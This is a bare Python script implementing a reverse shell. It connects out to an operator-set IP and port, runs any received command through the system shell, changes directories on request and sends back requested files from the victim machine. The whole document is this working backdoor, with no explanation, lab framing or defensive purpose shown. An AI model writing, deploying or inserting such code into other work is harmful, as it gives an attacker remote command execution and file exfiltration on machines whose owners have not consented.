import socket
import os
import subprocess


new_request = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new_request.connect(('127.0.0.1', 1234))  #change ip and port
new_request.send("connection made ...".encode())

while True:
    cmd = new_request.recv(1024).decode().strip()
    if cmd.startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            command = os.popen('cd').read()
            new_request.send(command.encode())
        except FileNotFoundError as e:
            new_request.send("\n Directory Not Found \n ".encode())

    elif cmd.startswith("get "):
        filename = cmd[4:].strip()
        size = os.path.getsize(filename)
        new_request.sendall(f"{size}\n".encode())
        try:
            with open(filename, "rb") as f:
                file_data = f.read()
                new_request.sendall(file_data)
                continue
        except FileNotFoundError as e:
            new_request.send("file not Found".encode())
            continue

    else:
        command = subprocess.run(f"{cmd}",shell=True, text=True, capture_output=True)
        output = command.stdout
        if not output:
            new_request.send(f"Invalid Command".encode())
        else:
            new_request.send(command.stdout.encode())
